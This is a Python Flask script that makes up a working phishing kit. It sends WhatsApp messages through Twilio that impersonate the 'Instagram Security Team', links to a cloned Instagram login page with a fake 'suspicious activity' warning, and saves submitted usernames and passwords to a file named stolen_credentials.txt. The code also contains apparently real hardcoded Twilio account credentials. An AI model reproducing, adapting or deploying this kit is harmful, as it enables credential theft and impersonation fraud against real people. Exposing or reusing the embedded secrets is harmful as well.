from twilio.rest import Client  # For sending WhatsApp messages
from flask import Flask, request, render_template_string, redirect, url_for  # For hosting the fake page
import random
import string
import time
import os

# Twilio credentials (read from environment variables if available)
ACCOUNT_SID = os.getenv("TWILIO_ACCOUNT_SID", "AC8ee16f7d6ee79578c54e6d742a08a491")
AUTH_TOKEN = os.getenv("TWILIO_AUTH_TOKEN", "101d3a2f7a260be38c7fa365a8f61be5")
TWILIO_PHONE = "whatsapp:+14155238886"  # Twilio WhatsApp sandbox number

# Flask app for the fake page
app = Flask(__name__)

# HTML for the phone number input page
PHONE_INPUT_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Send WhatsApp Message</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
        .container { max-width: 400px; margin: auto; padding: 20px; border: 1px solid #ccc; }
        input { width: 100%; padding: 8px; margin: 10px 0; }
        button { padding: 10px 20px; background-color: #4CAF50; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Enter Target Phone Number</h1>
        <form method="POST" action="/send-message">
            <input type="text" name="phone_number" placeholder="e.g., +123456789" required>
            <button type="submit">Send Message</button>
        </form>
    </div>
</body>
</html>
"""

# Enhanced Fake Instagram login page HTML (mimicking Instagram's design more closely)
FAKE_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Login</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            width: 350px;
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 40px 20px;
            text-align: center;
            box-sizing: border-box;
        }
        .logo {
            font-size: 50px;
            font-family: 'Billabong', cursive;
            margin-bottom: 20px;
            color: #262626;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        input {
            padding: 9px 0 7px 8px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
            font-size: 14px;
            line-height: 18px;
        }
        button {
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 7px;
            margin: 10px 0;
            border-radius: 5px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
        }
        button:disabled {
            background-color: #b2dffc;
        }
        .forgot-password {
            margin-top: 10px;
            font-size: 12px;
            color: #00376b;
        }
        .or-divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        .or-divider::before,
        .or-divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
            margin: 0 10px;
        }
        .facebook-login {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
        }
        .error-message {
            color: #ed4956;
            font-size: 14px;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        <p class="error-message">Suspicious activity detected. Please verify your account.</p>
        <form method="POST" action="/submit">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="or-divider">OR</div>
        <a href="#" class="facebook-login">Log in with Facebook</a>
        <div class="forgot-password">
            <a href="#" style="color: #00376b; text-decoration: none;">Forgot password?</a>
        </div>
        <div class="footer">© 2025 Instagram from Meta</div>
    </div>
</body>
</html>
"""

SUCCESS_PAGE = """
<!DOCTYPE html>
<html>
<head><title>Verified</title></head>
<body>
    <h1>Verification Successful</h1>
    <p>Your account has been verified. Thank you!</p>
</body>
</html>
"""

MESSAGE_SENT_PAGE = """
<!DOCTYPE html>
<html>
<head><title>Message Sent</title></head>
<body>
    <h1>Message Sent Successfully</h1>
    <p>The WhatsApp message has been sent to {phone_number}.</p>
    <p>Check the phone for the verification link.</p>
</body>
</html>
"""

ERROR_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Error</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
        .container { max-width: 600px; margin: auto; padding: 20px; }
        h1 { color: #d9534f; }
        p { font-size: 16px; }
        a { color: #007bff; text-decoration: none; }
        a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Failed to Send Message</h1>
        <p><strong>Error:</strong> {{ error_message }}</p>
        <p><a href="/">Try Again</a></p>
    </div>
</body>
</html>
"""

def generate_fake_link():
    """Generate a unique fake link that looks like Instagram's."""
    random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    # Simulate a real-looking Instagram link
    real_looking_link = f"https://instagram-login-verification.com/{random_string}"
    # Simulate a shortened link (e.g., bit.ly style)
    shortened_link = f"https://bit.ly/ig-{random_string[:6]}"
    # Actual link using Render URL
    actual_link = f"https://demo-3.onrender.com/{random_string}"  # Updated with your Render URL
    return real_looking_link, shortened_link, actual_link, random_string

def craft_phishing_message(shortened_link):
    """Craft a convincing WhatsApp phishing message in English."""
    message = f"""Hello,

We detected a suspicious login attempt on your Instagram account. To avoid account suspension, please verify your identity using the link below within 24 hours:

{shortened_link}

Instagram Security Team"""
    return message

def send_whatsapp_message(target_phone, message):
    """Send the phishing message via WhatsApp using Twilio."""
    client = Client(ACCOUNT_SID, AUTH_TOKEN)
    try:
        print(f"Sending WhatsApp message to {target_phone}...")
        message = client.messages.create(
            body=message,
            from_=TWILIO_PHONE,
            to=f"whatsapp:{target_phone}"
        )
        print(f"Message sent successfully! SID: {message.sid}")
        return True, None
    except Exception as e:
        error_message = str(e)
        print(f"Error sending message: {error_message}")
        print("Check if the target number is linked to WhatsApp Sandbox or if credentials are valid.")
        return False, error_message

# Flask routes
@app.route('/', methods=['GET'])
def index():
    """Display the phone number input page."""
    return render_template_string(PHONE_INPUT_PAGE)

@app.route('/send-message', methods=['POST'])
def send_message():
    """Handle phone number submission and send WhatsApp message."""
    target_phone = request.form.get('phone_number').strip()
    real_looking_link, shortened_link, actual_link, path = generate_fake_link()
    phishing_message = craft_phishing_message(shortened_link)
    
    # Send the message
    success, error_message = send_whatsapp_message(target_phone, phishing_message)
    if success:
        return render_template_string(MESSAGE_SENT_PAGE, phone_number=target_phone)
    else:
        # Ensure error_message is passed correctly
        if not error_message:
            error_message = "An unknown error occurred while sending the message."
        return render_template_string(ERROR_PAGE, error_message=error_message)

@app.route('/<path:path>', methods=['GET'])
def phishing_page(path):
    """Display the fake login page."""
    return render_template_string(FAKE_PAGE)

@app.route('/submit', methods=['POST'])
def submit_credentials():
    """Collect and save the submitted credentials."""
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Save to a file
    with open("stolen_credentials.txt", "a") as file:
        file.write(f"Username: {username}, Password: {password}, Time: {time.ctime()}\n")
    
    print(f"Collected: Username='{username}', Password='{password}'")
    return render_template_string(SUCCESS_PAGE)

if __name__ == "__main__":
    port = int(os.getenv("PORT", 5000))  # Use PORT environment variable for Render
    app.run(host='0.0.0.0', port=port, debug=False)
